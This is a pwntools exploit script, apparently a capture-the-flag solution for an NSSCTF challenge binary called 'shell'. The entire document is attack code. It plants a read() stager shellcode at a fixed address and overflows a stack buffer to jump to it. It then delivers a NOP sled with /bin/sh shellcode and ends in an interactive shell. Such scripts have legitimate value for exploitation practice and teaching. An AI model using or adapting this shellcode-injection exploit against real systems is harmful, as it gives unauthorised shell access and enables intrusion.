from pwn import *

p = process("shell")
#p = remote("node4.anna.nssctf.cn",28430)
context.arch = "amd64"

sc = shellcraft.read(0,0x6010a0,0x100)

sc = asm(sc)
name = 0x6010a0
payload = b"a"*(0xa+8) + p64(name)

p.sendlineafter("Please.\n",sc)

gdb.attach(p)
p.sendlineafter("Let's start!\n",payload)

sc = asm(shellcraft.sh())
pay2 = b"\x90"*0x50 + sc
p.send(pay2)

p.interactive()